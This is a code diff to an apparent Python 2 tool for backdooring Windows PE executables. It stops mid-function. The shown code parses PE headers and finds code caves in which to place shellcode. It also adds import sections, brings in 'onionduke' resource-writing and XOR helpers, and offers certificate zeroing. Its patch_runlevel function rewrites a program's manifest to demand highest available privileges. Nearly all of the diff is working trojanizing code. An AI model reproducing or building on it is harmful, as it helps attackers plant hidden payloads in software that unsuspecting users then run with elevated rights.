@@ -40,12 +40,19 @@ import time
 import subprocess
 import pefile
 import operator
+import cStringIO
+import random
+import string
+import re
 from random import choice
 from winapi import winapi
 from intel.intelCore import intelCore
 from intel.intelmodules import eat_code_caves
 from intel.WinIntelPE32 import winI32_shellcode
 from intel.WinIntelPE64 import winI64_shellcode
+from onionduke import onionduke
+from onionduke.onionduke import write_rsrc
+from onionduke.onionduke import xor_file
 
 
 MachineTypes = {'0x0': 'AnyMachineType',
@@ -84,7 +91,8 @@ class pebin():
                  CAVE_JUMPING=False, PORT=8888, HOST="127.0.0.1", SUPPLIED_SHELLCODE=None,
                  INJECTOR=False, CHANGE_ACCESS=True, VERBOSE=False, SUPPORT_CHECK=False,
                  SHELL_LEN=300, FIND_CAVES=False, SUFFIX=".old", DELETE_ORIGINAL=False, CAVE_MINER=False,
-                 IMAGE_TYPE="ALL", ZERO_CERT=True, CHECK_ADMIN=False, PATCH_DLL=True, PATCH_METHOD="MANUAL"):
+                 IMAGE_TYPE="ALL", ZERO_CERT=True, RUNAS_ADMIN=False, PATCH_DLL=True, PATCH_METHOD="MANUAL",
+                 SUPPLIED_BINARY=None, XP_MODE=False):
         self.FILE = FILE
         self.OUTPUT = OUTPUT
         self.SHELL = SHELL
@@ -106,12 +114,15 @@ class pebin():
         self.CAVE_MINER = CAVE_MINER
         self.IMAGE_TYPE = IMAGE_TYPE
         self.ZERO_CERT = ZERO_CERT
-        self.CHECK_ADMIN = CHECK_ADMIN
+        self.RUNAS_ADMIN = RUNAS_ADMIN
         self.PATCH_DLL = PATCH_DLL
         self.PATCH_METHOD = PATCH_METHOD.lower()
+        self.XP_MODE = XP_MODE
         self.flItms = {}
+        self.SUPPLIED_BINARY = SUPPLIED_BINARY
         if self.PATCH_METHOD.lower() == 'automatic':
             self.CAVE_JUMPING = True
+            self.ADD_SECTION = False
 
     def run_this(self):
         if self.INJECTOR is True:
@@ -150,10 +161,6 @@ class pebin():
         a file and returns a dict of file information called flItms.
         Takes a open file handle of self.binary
         """
-        #To do:
-        #   verify signed vs unsigned
-        #   map all headers
-        #   map offset once the magic field is determined of 32+/32
 
         self.binary.seek(int('3C', 16))
         print "[*] Gathering file info"
@@ -161,8 +168,6 @@ class pebin():
         self.flItms['buffer'] = 0
         self.flItms['JMPtoCodeAddress'] = 0
         self.flItms['LocOfEntryinCode_Offset'] = self.DISK_OFFSET
-        #---!!!! This will need to change for x64 !!!!
-        #not so sure now..
         self.flItms['dis_frm_pehdrs_sectble'] = 248
         self.flItms['pe_header_location'] = struct.unpack('<i', self.binary.read(4))[0]
         # Start of COFF
@@ -173,8 +178,6 @@ class pebin():
             for mactype, name in MachineTypes.iteritems():
                 if int(mactype, 16) == self.flItms['MachineType']:
                         print 'MachineType is:', name
-        #self.binary.seek(self.flItms['BoundImportLocation'])
-        #self.flItms['BoundImportLOCinCode'] = struct.unpack('<I', self.binary.read(4))[0]
         self.binary.seek(self.flItms['COFF_Start'] + 2, 0)
         self.flItms['NumberOfSections'] = struct.unpack('<H', self.binary.read(2))[0]
         self.flItms['TimeDateStamp'] = struct.unpack('<I', self.binary.read(4))[0]
@@ -195,6 +198,7 @@ class pebin():
         self.flItms['SizeOfUninitializedData'] = struct.unpack("<I",
                                                                self.binary.read(4))[0]
         self.flItms['AddressOfEntryPoint'] = struct.unpack('<I', self.binary.read(4))[0]
+        self.flItms['PatchLocation'] = self.flItms['AddressOfEntryPoint']
         self.flItms['BaseOfCode'] = struct.unpack('<I', self.binary.read(4))[0]
         if self.flItms['Magic'] != 0x20B:
             self.flItms['BaseOfData'] = struct.unpack('<I', self.binary.read(4))[0]
@@ -237,10 +241,10 @@ class pebin():
         self.flItms['NumberofRvaAndSizes'] = struct.unpack('<I', self.binary.read(4))[0]
         # End Windows-Specific Fields of Optional Header
         # Begin Data Directories of Optional Header
-        self.flItms['ExportTable'] = struct.unpack('<Q', self.binary.read(8))[0]
+        self.flItms['ExportTableRVA'] = struct.unpack('<I', self.binary.read(4))[0]
+        self.flItms['ExportTableSize'] = struct.unpack('<I', self.binary.read(4))[0]
         self.flItms['ImportTableLOCInPEOptHdrs'] = self.binary.tell()
         #ImportTable SIZE|LOC
-        #self.flItms['ImportTable'] = struct.unpack('<Q', self.binary.read(8))[0]
         self.flItms['ImportTableRVA'] = struct.unpack('<I', self.binary.read(4))[0]
         self.flItms['ImportTableSize'] = struct.unpack('<I', self.binary.read(4))[0]
         self.flItms['ResourceTable'] = struct.unpack('<Q', self.binary.read(8))[0]
@@ -253,7 +257,9 @@ class pebin():
         self.flItms['Architecture'] = struct.unpack('<Q', self.binary.read(8))[0]  # zero
         self.flItms['GlobalPrt'] = struct.unpack('<Q', self.binary.read(8))[0]
         self.flItms['TLS Table'] = struct.unpack('<Q', self.binary.read(8))[0]
-        self.flItms['LoadConfigTable'] = struct.unpack('<Q', self.binary.read(8))[0]
+        self.flItms['LoadConfigTableRVA'] = struct.unpack('<I', self.binary.read(4))[0]
+        self.flItms['LoadConfigTableSize'] = struct.unpack('<I', self.binary.read(4))[0]
+        #self.flItms['LoadConfigTable'] = struct.unpack('<Q', self.binary.read(8))[0]
         self.flItms['BoundImportLocation'] = self.binary.tell()
         #print 'BoundImportLocation', hex(self.flItms['BoundImportLocation'])
         self.flItms['BoundImport'] = struct.unpack('<Q', self.binary.read(8))[0]
@@ -268,6 +274,7 @@ class pebin():
         self.flItms['Reserved'] = struct.unpack('<Q', self.binary.read(8))[0]  # zero
         self.flItms['BeginSections'] = self.binary.tell()
 
+        # This could be fixed in the great refactor.
         if self.flItms['NumberOfSections'] is not 0 and 'Section' not in self.flItms:
             self.flItms['Sections'] = []
             for section in range(self.flItms['NumberOfSections']):
@@ -300,30 +307,37 @@ class pebin():
                    'UPX1\x00\x00\x00\x00' == sectionValues[0] or
                    'CODE\x00\x00\x00\x00' == sectionValues[0]):
                     self.flItms['textSectionName'] = sectionValues[0]
+                    self.flItms['textVirtualSize'] = sectionValues[1]
                     self.flItms['textVirtualAddress'] = sectionValues[2]
+                    self.flItms['textSizeRawData'] = sectionValues[3]
                     self.flItms['textPointerToRawData'] = sectionValues[4]
+
+                    self.flItms['LocOfEntryinCode'] = (self.flItms['AddressOfEntryPoint'] -
+                                                       self.flItms['textVirtualAddress'] +
+                                                       self.flItms['textPointerToRawData'] +
+                                                       self.flItms['LocOfEntryinCode_Offset'])
                 elif '.rsrc\x00\x00\x00' == sectionValues[0]:
                     self.flItms['rsrcSectionName'] = sectionValues[0]
+                    self.flItms['rsrcVirtualSize'] = sectionValues[1]
                     self.flItms['rsrcVirtualAddress'] = sectionValues[2]
                     self.flItms['rsrcSizeRawData'] = sectionValues[3]
                     self.flItms['rsrcPointerToRawData'] = sectionValues[4]
 
-                # I could add in checks here to support out of order PE file;
-                #  However if here were multiple sections that were RE, RWE, it would be
-                #  difficult to get it right in a purposefully mangled binary.
-                #  Perhaps if entrypoint is in RE section that is text section? But still.
-                #  That could be spoofed and it returns to another RE section.
+            # I could add in checks here to support an out of order PE file;
+            #  However if here were multiple sections that were RE, RWE, it would be
+            #  difficult to get it right in a purposefully mangled binary.
+            #  Perhaps if entrypoint is in RE section that is text section? But still.
+            #  That could be spoofed and it returns to another RE section.
+            if self.PATCH_METHOD != 'onionduke':
                 if "textSectionName" not in self.flItms:
                     print "[!] Text section does not have a normal name, not guessing, exiting"
                     print "[!]\tFirst section, text section potential name:", str(self.flItms['Sections'][0][0])
                     return False
-
+            else:
+                self.flItms['LocOfEntryinCode'] = (self.flItms['AddressOfEntryPoint'] -
+                                                   self.flItms['LocOfEntryinCode_Offset'])
             self.flItms['VirtualAddress'] = self.flItms['SizeOfImage']
 
-            self.flItms['LocOfEntryinCode'] = (self.flItms['AddressOfEntryPoint'] -
-                                               self.flItms['textVirtualAddress'] +
-                                               self.flItms['textPointerToRawData'] +
-                                               self.flItms['LocOfEntryinCode_Offset'])
         else:
             self.flItms['LocOfEntryinCode'] = (self.flItms['AddressOfEntryPoint'] -
                                                self.flItms['LocOfEntryinCode_Offset'])
@@ -333,6 +347,39 @@ class pebin():
         self.binary.seek(self.flItms['BoundImportLOCinCode'])
         self.flItms['ImportTableALL'] = self.binary.read(self.flItms['BoundImportSize'])
         self.flItms['NewIATLoc'] = self.flItms['BoundImportLOCinCode'] + 40
+        #ParseLoadConfigTable
+        for section in reversed(self.flItms['Sections']):
+            if self.flItms['LoadConfigTableRVA'] >= section[2]:
+                #go to exact export directory location
+                self.binary.seek((self.flItms['LoadConfigTableRVA'] - section[2]) + section[4])
+                break
+        self.flItms['LoadConfigDirectory_Size'] = struct.unpack('<I', self.binary.read(4))[0]
+        self.flItms['LoadConfigDirectory_TimeDataStamp'] = struct.unpack('<I', self.binary.read(4))[0]
+        self.flItms['LoadConfigDirectory_MajorVersion'] = struct.unpack('<H', self.binary.read(2))[0]
+        self.flItms['LoadConfigDirectory_MinorVersion'] = struct.unpack('<H', self.binary.read(2))[0]
+        self.flItms['LoadConfigDirectory_GFC'] = struct.unpack('<I', self.binary.read(4))[0]
+        self.flItms['LoadConfigDirectory_GFS'] = struct.unpack('<I', self.binary.read(4))[0]
+        self.flItms['LoadConfigDirectory_CSDT'] = struct.unpack('<I', self.binary.read(4))[0]
+        self.flItms['LoadConfigDirectory_DFBT'] = struct.unpack('<I', self.binary.read(4))[0]
+        self.flItms['LoadConfigDirectory_DTFT'] = struct.unpack('<I', self.binary.read(4))[0]
+        self.flItms['LoadConfigDirectory_LPTV'] = struct.unpack('<I', self.binary.read(4))[0]
+        self.flItms['LoadConfigDirectory_MAS'] = struct.unpack('<I', self.binary.read(4))[0]
+        self.flItms['LoadConfigDirectory_VMT'] = struct.unpack('<I', self.binary.read(4))[0]
+        self.flItms['LoadConfigDirectory_PHF'] = struct.unpack('<I', self.binary.read(4))[0]
+        self.flItms['LoadConfigDirectory_PAM'] = struct.unpack('<I', self.binary.read(4))[0]
+        self.flItms['LoadConfigDirectory_CSDV'] = struct.unpack('<H', self.binary.read(2))[0]
+        self.flItms['LoadConfigDirectory_Reserved'] = struct.unpack('<H', self.binary.read(2))[0]
+        self.flItms['LoadConfigDirectory_ELVA'] = struct.unpack('<I', self.binary.read(4))[0]
+        self.flItms['LoadConfigDirectory_SCVA'] = struct.unpack('<I', self.binary.read(4))[0]
+        self.flItms['LoadConfigDirectory_SEHTVA'] = struct.unpack('<I', self.binary.read(4))[0]
+        self.flItms['LoadConfigDirectory_SEHC'] = struct.unpack('<I', self.binary.read(4))[0]
+        if self.flItms['LoadConfigDirectory_Size'] > 0x48:
+            #grab CFG info
+            self.flItms['LCD_CFG_address_CF_PTR'] = struct.unpack('<I', self.binary.read(4))[0]
+            self.flItms['LCD_CFG_Reserved'] = struct.unpack('<I', self.binary.read(4))[0]
+            self.flItms['LCD_CFG_Func_Table'] = struct.unpack('<I', self.binary.read(4))[0]
+            self.flItms['LCD_CFG_Func_Count'] = struct.unpack('<I', self.binary.read(4))[0]
+            self.flItms['LCD_CFG_Guard_Flags'] = struct.unpack('<I', self.binary.read(4))[0]
 
     def check_apis(self, aFile):
         ####################################
@@ -356,10 +403,10 @@ class pebin():
                                 self.flItms[api + 'Offset'] = imp.address - pe.OPTIONAL_HEADER.ImageBase
                                 self.flItms[api] = imp.address
                                 apiFound = True
-
                     if apiFound is False:
                         self.flItms['neededAPIs'].add(api)
 
+                
             except Exception as e:
                 print "Exception:", str(e)
             self.flItms['ImportTableFileOffset'] = pe.get_physical_by_rva(self.flItms['ImportTableRVA'])
@@ -510,6 +557,10 @@ class pebin():
         """
         print "[*] Adding New Section for updated Import Table"
 
+        if "UPX".lower() in self.flItms['textSectionName'].lower():
+            print "[!] Cannot patch a new IAT into a UPX binary at this time."
+            return False
+
         with open(self.flItms['backdoorfile'], 'r+b') as self.binary:
             self.flItms['NewSectionSize'] = 0x1000
             self.flItms['SectionName'] = 'rdata1'  # less than 7 chars
@@ -520,6 +571,11 @@ class pebin():
             self.flItms['SizeOfRawData'] = self.flItms['VirtualSize']
             self.flItms['NewSectionName'] = "." + self.flItms['SectionName']
             self.flItms['newSectionFlags'] = int('C0000040', 16)
+            #get file size
+            filesize = os.stat(self.flItms['filename']).st_size
+            if filesize > self.flItms['SizeOfImage']:
+                print "[!] File has extra data after last section, cannot add new section"
+                return False
             self.binary.seek(self.flItms['pe_header_location'] + 6, 0)
             self.binary.write(struct.pack('<H', self.flItms['NumberOfSections'] + 1))
             self.binary.seek(self.flItms['SizeOfImageLoc'], 0)
@@ -538,8 +594,7 @@ class pebin():
             self.binary.write(struct.pack('<I', self.flItms['SizeOfRawData']))
             self.binary.write(struct.pack('<I', self.flItms['newSectionPointerToRawData']))
             if self.VERBOSE is True:
-                print 'New Section PointerToRawData'
-                print self.flItms['newSectionPointerToRawData']
+                print 'New Section PointerToRawData:', self.flItms['newSectionPointerToRawData']
             self.binary.write(struct.pack('<I', 0))
             self.binary.write(struct.pack('<I', 0))
             self.binary.write(struct.pack('<I', 0))
@@ -548,7 +603,18 @@ class pebin():
 
             self.binary.seek(self.flItms['ImportTableFileOffset'], 0)
             #-20 here
-            self.flItms['Import_Directory_Table'] = self.binary.read(self.flItms['ImportTableSize'] - 20)
+            self.flItms['Import_Directory_Table'] = ''
+            
+            while True:
+                check_chars = "\x00" * 20
+                read_data = self.binary.read(20)
+                if read_data == check_chars:
+                    #Found end of import directory
+                    break
+                self.flItms['Import_Directory_Table'] +=  read_data
+                
+            #self.flItms['Import_Directory_Table'] = self.binary.read(self.flItms['ImportTableSize'] - 20)
+            #print "IDT", self.flItms['Import_Directory_Table'].encode('hex')
             self.binary.seek(self.flItms['newSectionPointerToRawData'], 0)  # moving to end of file
             #test write
             self.binary.write(self.flItms['Import_Directory_Table'])
@@ -556,20 +622,14 @@ class pebin():
             self.flItms['BeginningOfNewImports'] = self.flItms['SizeOfImage'] + len(self.flItms['Import_Directory_Table'])
             self.build_imports()
             #and remove here
-            #self.binary.seek(-20, 1)
             self.binary.write(self.flItms['addedIAT'])
             self.binary.write(struct.pack("<B", 0x0) * (self.flItms['NewSectionSize'] -
                               len(self.flItms['addedIAT']) - len(self.flItms['Import_Directory_Table']) + 20))
             self.binary.seek(self.flItms['ImportTableLOCInPEOptHdrs'], 0)
             self.binary.write(struct.pack('<I', self.flItms['SizeOfImage']))
-            self.binary.write(struct.pack("<I", (len(self.flItms['Import_Directory_Table']) + self.flItms['apiCount'] * 8)))
+            self.binary.write(struct.pack("<I", (self.flItms['ImportTableSize']) + self.flItms['apiCount'] * 8 + 20))
             self.binary.seek(0)
             #For trimming File of cert (if there)
-            #temp_File = self.binary.read(self.flItms['newSectionPointerToRawData'] + self.flItms['NewSectionSize'])
-
-        #with open(self.flItms['backdoorfile'], 'w') as f:
-        #    f.write(temp_File)
-        #    temp_File = ''
 
         #get file data again
         with open(self.flItms['backdoorfile'], 'r+b') as self.binary:
@@ -628,7 +688,7 @@ class pebin():
                                                  self.flItms['ImageBase'])
         self.flItms['buffer'] = int('200', 16)  # bytes
         self.flItms['JMPtoCodeAddress'] = (self.flItms['CodeCaveVirtualAddress'] -
-                                           self.flItms['AddressOfEntryPoint'] -
+                                           self.flItms['PatchLocation'] -
                                            self.flItms['ImageBase'] - 5 +
                                            self.flItms['buffer'])
 
@@ -719,26 +779,46 @@ class pebin():
         caveSpecs = []
         self.binary.seek(0)
 
-        while True:
-            try:
-                s = struct.unpack("<b", self.binary.read(1))[0]
-            except:     # Exception as e:
-                #print "CODE CAVE", str(e)
-                break
-            if s == 0:
-                if count == 1:
-                    BeginCave = Tracking
-                count += 1
-            else:
-                if count >= SIZE_CAVE_TO_FIND:
-                    #Add a four byte buffer between objects
-                    caveSpecs.append(BeginCave + 4)
-                    caveSpecs.append(Tracking - 4)
-                    caveTracker.append(caveSpecs)
-                count = 1
-                caveSpecs = []
+        if self.PATCH_METHOD == 'automatic':
+            #  This is so much faster than the other
 
-            Tracking += 1
+            cave_set = set()
+            for k, item in enumerate(sorted(self.flItms['len_allshells'])):
+                cave_buffer = "\x00" * (item + 8)
+                p = re.compile(cave_buffer)
+                self.binary.seek(0)
+                for m in p.finditer(self.binary.read()):
+                    #print m.start(), m.group()
+                    caveSpecs.append(m.start() + 4)
+                    caveSpecs.append(m.start() + item + 8)
+                    caveTracker.append(caveSpecs)
+                    caveSpecs = []
+            self.binary.seek(0)
+        
+        else:   
+            # Manual Slow method
+            while True:
+                # TODO: ADD in Fast Mode
+                # Jump to near end of .text section and start parsing there.
+                try:
+                    s = struct.unpack("<b", self.binary.read(1))[0]
+                except:     # Exception as e:
+                    #print "CODE CAVE", str(e)
+                    break
+                if s == 0:
+                    if count == 1:
+                        BeginCave = Tracking
+                    count += 1
+                else:
+                    if count >= SIZE_CAVE_TO_FIND:
+                        #Add a four byte buffer between objects
+                        caveSpecs.append(BeginCave + 4)
+                        caveSpecs.append(Tracking - 4)
+                        caveTracker.append(caveSpecs)
+                    count = 1
+                    caveSpecs = []
+
+                Tracking += 1
 
         pickACave = {}
         for i, caves in enumerate(caveTracker):
@@ -759,12 +839,13 @@ class pebin():
                             print 'End of Raw Data:', hex(section[3] + section[4])
                             print '*' * 50
                         JMPtoCodeAddress = (section[2] + caves[0] - section[4] -
-                                            5 - self.flItms['AddressOfEntryPoint'])
+                                            5 - self.flItms['PatchLocation'])
 
                         sectionFound = True
                         pickACave[i] = [section[0], hex(caves[0]), hex(caves[1]),
                                         caves[1] - caves[0], hex(section[4]),
-                                        hex(section[3] + section[4]), JMPtoCodeAddress]
+                                        hex(section[3] + section[4]), JMPtoCodeAddress,
+                                        section[1], section[2]]
                         break
                 except:
                     print "-End of File Found.."
@@ -778,7 +859,7 @@ class pebin():
                         print '*' * 50
 
                 JMPtoCodeAddress = (section[2] + caves[0] - section[4] -
-                                    5 - self.flItms['AddressOfEntryPoint'])
+                                    5 - self.flItms['PatchLocation'])
                 try:
                     pickACave[i] = [None, hex(caves[0]), hex(caves[1]),
                                     caves[1] - caves[0], None,
@@ -790,81 +871,50 @@ class pebin():
 
         if self.PATCH_METHOD.lower() == 'automatic':
             print "[*] Attempting PE File Automatic Patching"
-            rsrcCaves = {}
-            otherCaves = {}
+            availableCaves = {}
             #sort caves by type (rsrc, others)
+            # Take away the rsrc restriction, solved
             for caveNumber, caveValues in pickACave.iteritems():
                 if caveValues[0] is None:
                     continue
-                if 'rsrc' in caveValues[0].lower():
-                    if caveValues[3] >= 100:
-                        rsrcCaves[caveNumber] = caveValues[3]
-                elif caveValues[3] >= 100:
-                    otherCaves[caveNumber] = caveValues[3]
+                elif caveValues[3] >= 50:
+                    availableCaves[caveNumber] = caveValues[3]
+                    
             #serialize caves:
 
             payloadDict = {}
             for k, item in enumerate(self.flItms['len_allshells']):
                 payloadDict[k] = item
-
+                
             # choose other Caves first.
-            trackingVar = True
 
             while True:
                 # for tracking sections to change perms on
                 trackSectionName = set()
 
                 # other caves first
-                if trackingVar is True and len(self.flItms['len_allshells']) <= len(otherCaves):
-                    for ref in sorted(payloadDict.items(), key=operator.itemgetter(1), reverse=True):
-                        # largest first
-                        # now drop the caves that are big enough in a set
-                        # and randomly select from it
-                        _tempCaves = {}
-                        for refnum, caveSize in otherCaves.iteritems():
-                            if caveSize >= ref[1]:
-                                _tempCaves[refnum] = caveSize
-                        if _tempCaves == {}:
-                            # nothing? get out
-                            trackingVar = False
-                            break
+                for ref in sorted(payloadDict.items(), key=operator.itemgetter(1), reverse=True):
+                    # largest first
+                    # now drop the caves that are big enough in a set
+                    # and randomly select from it
+                    _tempCaves = {}
+                    for refnum, caveSize in availableCaves.iteritems():
+                        if caveSize >= ref[1]:
+                            _tempCaves[refnum] = caveSize
+                    if _tempCaves == {}:
+                        # nothing? get out
+                        break
 
-                        selection = choice(_tempCaves.keys())
-                        print '[!] Selected:', str(selection) + ":", ("Section Name: {0}; Cave begin: {1} End: {2}; "
-                                                                      "Cave Size: {3}".format(pickACave[selection][0], pickACave[selection][1],
-                                                                                              pickACave[selection][2], pickACave[selection][3],
-                                                                                              ))
-                        trackSectionName.add(pickACave[selection][0])
-                        #remove the selection from the dict
-                        otherCaves.pop(selection)
-                        CavesPicked[ref[0]] = pickACave[selection]
-                    break
-
-                # experience has proven that rsrc can be an unpredictable section
-                #  for patching, either do rsrc only or not at all
-                else:
-                    print "[!] Using only the .rsrc section"
-                    for ref in sorted(payloadDict.items(), key=operator.itemgetter(1), reverse=True):
-                        #largest first
-                        # now drop the caves that are big enough in a set
-                        # and randomly select from it
-                        _tempCaves = {}
-                        for refnum, caveSize in rsrcCaves.iteritems():
-                            if caveSize >= ref[1]:
-                                _tempCaves[refnum] = caveSize
-                        if _tempCaves == {}:
-                            trackingVar = False
-                            break
-                        selection = choice(_tempCaves.keys())
-                        print '[!] Selected:', str(selection) + ":", ("Section Name: {0}; Cave begin: {1} End: {2}; "
-                                                                      "Cave Size: {3}".format(pickACave[selection][0], pickACave[selection][1],
-                                                                                              pickACave[selection][2], pickACave[selection][3],
-                                                                                              ))
-                        trackSectionName.add(pickACave[selection][0])
-                        #remove the selection from the dict
-                        rsrcCaves.pop(selection)
-                        CavesPicked[ref[0]] = pickACave[selection]
-                    break
+                    selection = choice(_tempCaves.keys())
+                    print '[!] Selected:', str(selection) + ":", ("Section Name: {0}; Cave begin: {1} End: {2}; "
+                                                                  "Cave Size: {3}; Payload Size: {4}".format(pickACave[selection][0], pickACave[selection][1],
+                                                                                          pickACave[selection][2], pickACave[selection][3], ref[1]
+                                                                                          ))
+                    trackSectionName.add(pickACave[selection][0])
+                    #remove the selection from the dict
+                    availableCaves.pop(selection)
+                    CavesPicked[ref[0]] = pickACave[selection]
+                break
 
             if len(CavesPicked) != len(self.flItms['len_allshells']):
                 print "[!] Did not find suitable caves - trying next method"
@@ -890,7 +940,7 @@ class pebin():
 
                 if pickACave == {}:
                     print "[!!!!] No caves available! Use 'j' for cave jumping or"
-                    print "[!!!!] 'i' for ignore."
+                    print "[!!!!] 'i' or 'q' for ignore."
                 for ref, details in pickACave.iteritems():
                     if details[3] >= item:
                         print str(ref) + ".", ("Section Name: {0}; Section Begin: {4} "
@@ -926,10 +976,12 @@ class pebin():
                             continue
                     except:
                         pass
-                    breakOutValues = ['append', 'jump', 'single', 'ignore', 'a', 'j', 's', 'i']
+                    breakOutValues = ['append', 'jump', 'single', 'ignore', 'a', 'j', 's', 'i', 'q']
                     if selection.lower() in breakOutValues:
                         return selection
-
+        else:
+            print "[!] Invalid Patching Method"
+            return None
         return CavesPicked
 
     def runas_admin(self):
@@ -939,25 +991,182 @@ class pebin():
 
         """
         #g = open(flItms['filename'], "rb")
-        runas_admin = False
-        print "[*] Checking Runas_admin"
+        result = False
+        print "[*] Checking Execution Level"
         if 'rsrcPointerToRawData' in self.flItms:
-            self.binary.seek(self.flItms['rsrcPointerToRawData'], 0)
             search_lngth = len('requestedExecutionLevel level="highestAvailable"')
             data_read = 0
-            while data_read < self.flItms['rsrcSizeRawData']:
-                self.binary.seek(self.flItms['rsrcPointerToRawData'] + data_read, 0)
+            while data_read < (self.flItms['rsrcPointerToRawData'] +
+                               self.flItms['rsrcSizeRawData'] -
+                               self.flItms['manifestLOC']):
+                self.binary.seek(self.flItms['manifestLOC'] + data_read, 0)
                 temp_data = self.binary.read(search_lngth)
                 if temp_data == 'requestedExecutionLevel level="highestAvailable"':
-                    runas_admin = True
+                    result = True
                     break
                 data_read += 1
-        if runas_admin is True:
+
+        if result is True:
             print "[*] %s must run with highest available privileges" % self.FILE
         else:
             print "[*] %s does not require highest available privileges" % self.FILE
 
-        return runas_admin
+        return result
+
+    def patch_runlevel(self):
+        """
+        This module jumps to .rsrc section and checks for
+        the following string: requestedExecutionLevel level="highestAvailable"
+        and if not there patches it in
+
+        """
+        #g = open(flItms['filename'], "rb")
+        result = False
+        print "[*] Checking execution Level"
+        if 'rsrcPointerToRawData' in self.flItms:
+            search_lngth = len('requestedExecutionLevel')
+            data_read = 0
+            found_exeLevel = True
+            while data_read < (self.flItms['rsrcPointerToRawData'] +
+                               self.flItms['rsrcSizeRawData'] -
+                               self.flItms['manifestLOC']):
+                self.binary.seek(self.flItms['manifestLOC'] + data_read, 0)
+                temp_data = self.binary.read(search_lngth)
+                if temp_data == 'requestedExecutionLevel':
+                    found_exeLevel = True
+                    search_lngth = len('level=')
+                    if self.binary.read(search_lngth + 1) == ' level=':
+                        if self.binary.read(len("\"highestAvailable\"")) == "\"highestAvailable\"":
+                            print "[*] File already set to highestAvailable execution level"
+                            break
+                        else:
+                            print "[!] Patching 'highestAvailable' in PE Manifest"
+                            self.binary.seek(self.flItms['manifestLOC'] + data_read + len(temp_data) + search_lngth + 1, 0)
+                            self.binary.write("\"highestAvailable\"")
+                            result = True
+                            while True:
+                                reading_position = self.binary.tell()
+                                if self.binary.read(1) != ">":  # end of the xml block
+                                    self.binary.seek(reading_position)
+                                    self.binary.write("\x20")
+                                else:
+                                    return True
+                                    break
+                if temp_data == 'level=' and found_exeLevel is True:
+                    #this is what I call a spread out manifest
+                    if self.binary.read(len("\"highestAvailable\"")) == "\"highestAvailable\"":
+                        print "[*] File already set to highestAvailable execution level"
+                        break
+                    else:
+                        print "[!] Patching 'highestAvailable' in PE Manifest"
+                        self.binary.seek(self.flItms['manifestLOC'] + data_read + len(temp_data), 0)
+                        self.binary.write("\"highestAvailable\"")
+                        result = True
+
+                data_read += 1
+
+        return result
+
+    def parse_rsrc(self):
+        '''
+        This parses a .rsrc section for quick modification
+        '''
+        self.rsrc_structure = {}
+
+        def parse_header():
+            return {"Characteristics": struct.unpack("<I", self.binary.read(4))[0],
+                    "TimeDataStamp": struct.unpack("<I", self.binary.read(4))[0],
+                    "MajorVersion": struct.unpack("<H", self.binary.read(2))[0],
+                    "MinorVersion": struct.unpack("<H", self.binary.read(2))[0],
+                    "NumberOfNamedEntries": struct.unpack("<H", self.binary.read(2))[0],
+                    "NumberofIDEntries": struct.unpack("<H", self.binary.read(2))[0],
+                    }
+
+        def merge_two_dicts(x, y):
+            '''Given two dicts, merge them into a new dict as a shallow copy.'''
+            z = x.copy()
+            z.update(y)
+            return z
+
+        def parse_data_entry():
+            return {"WriteME": self.binary.tell(),
+                    "RVA of Data": struct.unpack("<I", self.binary.read(4))[0],
+                    "Size": struct.unpack("<I", self.binary.read(4))[0],
+                    "CodePage": struct.unpack("<I", self.binary.read(4))[0],
+                    "Reserved": struct.unpack("<I", self.binary.read(4))[0]
+                    }
+
+        def parse_ID(number):
+            temp = {}
+            for i in range(0, number):
+                _tempid = struct.unpack("<I", self.binary.read(4))[0]
+                temp[_tempid] = struct.unpack("<I", self.binary.read(4))[0]
+            return temp
+
+        #parse initial header
+        if "rsrcPointerToRawData" not in self.flItms:
+            return False
+        self.binary.seek(self.flItms['rsrcPointerToRawData'], 0)
+        self.rsrc_structure['Typeheader'] = parse_header()
+        self.rsrc_structure['Typeheader']['NameEntries'] = {}
+        self.rsrc_structure['Typeheader']["IDentries"] = {}
+
+        if self.rsrc_structure['Typeheader']["NumberofIDEntries"]:
+            self.rsrc_structure['Typeheader']["IDentries"] = parse_ID(self.rsrc_structure['Typeheader']["NumberofIDEntries"])
+        if self.rsrc_structure['Typeheader']["NumberOfNamedEntries"]:
+            self.rsrc_structure['Typeheader']['NameEntries'] = parse_ID(self.rsrc_structure['Typeheader']['NumberOfNamedEntries'])
+
+        #merge, flatten
+        self.rsrc_structure['Typeheader']['Entries'] = merge_two_dicts(self.rsrc_structure['Typeheader']["IDentries"],
+                                                                       self.rsrc_structure['Typeheader']['NameEntries'])
+
+        for entry, value in self.rsrc_structure['Typeheader']["Entries"].iteritems():
+            if entry == 24:  # 24 is the Manifest resource
+                self.binary.seek(self.flItms['rsrcPointerToRawData'] + (value & 0xffffff), 0)
+
+                self.rsrc_structure[entry] = parse_header()
+                self.rsrc_structure[entry]["IDs"] = {}
+                self.rsrc_structure[entry]["Names"] = {}
+
+                if self.rsrc_structure[entry]["NumberofIDEntries"]:
+                    self.rsrc_structure[entry]["IDs"] = parse_ID(self.rsrc_structure[entry]["NumberofIDEntries"])
+
+                if self.rsrc_structure[entry]["NumberOfNamedEntries"]:
+                #print 'self.rsrc_structure[entry]["NumberOfNamedEntries"]', self.rsrc_structure[entry]["NumberOfNamedEntries"]
+                    self.rsrc_structure[entry]["Names"] = parse_ID(self.rsrc_structure[entry]["NumberOfNamedEntries"])
+
+                self.rsrc_structure[entry]["NameIDs"] = merge_two_dicts(self.rsrc_structure[entry]["IDs"],
+                                                                        self.rsrc_structure[entry]["Names"])
+
+                #Now get language
+                for name_id, offset in self.rsrc_structure[entry]["NameIDs"].iteritems():
+                    self.binary.seek(self.flItms['rsrcPointerToRawData'] + (offset & 0xffffff), 0)
+                    #print self.rsrc_structure
+                    self.rsrc_structure[name_id] = parse_header()
+                    self.rsrc_structure[name_id]["IDs"] = {}
+                    self.rsrc_structure[name_id]["Names"] = {}
+
+                    if self.rsrc_structure[name_id]["NumberofIDEntries"]:
+                        self.rsrc_structure[name_id]["IDs"] = parse_ID(self.rsrc_structure[name_id]["NumberofIDEntries"])
+
+                    if self.rsrc_structure[name_id]["NumberOfNamedEntries"]:
+                        self.rsrc_structure[name_id]["Names"] = parse_ID(self.rsrc_structure[name_id]["NumberOfNamedEntries"])
+
+                    self.rsrc_structure[name_id]["language"] = merge_two_dicts(self.rsrc_structure[name_id]["IDs"],
+                                                                               self.rsrc_structure[name_id]["Names"])
+
+                    #now get Data Entry Details and write
+                    for lanID, offsetDataEntry in self.rsrc_structure[name_id]["language"].iteritems():
+                        #print lanID
+                        self.binary.seek(self.flItms['rsrcPointerToRawData'] + (offsetDataEntry & 0xffffff), 0)
+                        self.rsrc_structure[lanID] = parse_data_entry()
+                    #Jump to Manifest
